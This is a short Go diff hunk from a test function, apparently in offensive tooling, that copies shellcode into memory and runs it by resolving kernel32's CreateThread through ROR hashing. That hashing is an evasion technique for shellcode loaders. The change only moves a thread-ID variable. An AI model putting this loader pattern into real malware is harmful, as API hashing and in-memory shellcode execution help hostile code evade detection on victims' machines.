@@ -72,16 +72,15 @@ func testAPICall() {
 	dst := unsafe.Slice((*byte)(unsafe.Pointer(scAddr)), size)
 	copy(dst, shellcode)
 
-	var threadID uint32
-	tidPtr := uintptr(unsafe.Pointer(&threadID))
-
 	hashData, keyData, err := rorwk.Hash64("kernel32.dll", "CreateThread")
 	checkError(err)
 	hash := rorwk.BytesToUintptr(hashData)
 	key := rorwk.BytesToUintptr(keyData)
+	var threadID uint32
 	handle, _, err := syscall.SyscallN(
 		scAddr, hash, key,
-		0, 0, scAddr, 0, windows.CREATE_SUSPENDED, tidPtr,
+		0, 0, scAddr, 0, windows.CREATE_SUSPENDED,
+		uintptr(unsafe.Pointer(&threadID)),
 	)
 	fmt.Println(err)
 
